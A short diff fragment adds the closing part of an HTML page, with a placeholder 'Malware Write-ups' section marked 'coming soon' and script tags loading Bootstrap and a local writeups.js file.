+    </section>
+
+    <section id="malware-writeups" class="content-section">
+      <h2>Malware Write-ups</h2>
+      <p>Malware analysis write-ups coming soon...</p>
+    </section>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="writeups.js"></script>
+</body>
+
+</html>
